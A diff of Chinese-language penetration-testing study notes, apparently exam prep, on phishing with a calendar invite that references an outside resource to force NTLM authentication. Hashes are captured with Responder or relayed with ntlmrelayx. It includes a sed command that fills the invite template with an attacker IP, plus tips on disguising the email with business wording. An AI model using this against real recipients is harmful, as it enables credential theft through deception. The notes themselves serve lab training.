@@ -6,7 +6,7 @@
 
 > 一句话：知道收件人地址、目标会处理会议邀请、但没有宏执行机会 → 发一个**引用外部资源**的 `.ics` 邀请，诱使日历客户端在解析/渲染/提醒时主动访问我方资源并发起认证；攻击机侧用 Responder 捕获哈希，或用 ntlmrelayx 直接中继到别的 SMB 目标。
 >
-> 教材第 5 章（Initial Access / 客户端侧）；cheat sheet 关键词：`Relay Attacks`、`Capture Hashes`（见  ~L6207 与 ~L7381）。
+> 教材第 5 章（Initial Access / 客户端侧）；cheat sheet 关键词：`Relay Attacks`、`Capture Hashes`（见 cheat sheet ~L6207 与 ~L7381）。
 >
 > **核心认知：触发条件取决于日历客户端的版本与配置——"收到邀请 / 被接受" ≠ "会发起认证"。必须先有认证日志证据，再谈后续。**
 
@@ -79,7 +79,7 @@ sed -e "s/LHOST/192.168.45.10/g" \
     -e "s|URL|http://192.168.45.10|g" \
     -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
     -e "s/TOKEN/${TOKEN}/g" \
-     \
+    m16-ics-invite.ics \
     > invite-${TOKEN}.ics
 head -20 invite-${TOKEN}.ics      # 确认替换结果再发
 ```
@@ -304,7 +304,7 @@ esac
 
 ---
 
-## 10. 考试注意 OPSEC
+## 10. 考试注意 / OPSEC
 
 - **Responder 是投毒工具**：默认会抢答 LLMNR/NBT-NS/WPAD。考试里只在需要收认证时才开、只监听目标所在网卡，并记录"为什么开"；用完立即停。
 - **发信动作会留痕**：只向明确的目标账户投递，不要群发；邮件主题/内容用合理的业务话术，避免把攻击意图写在正文。
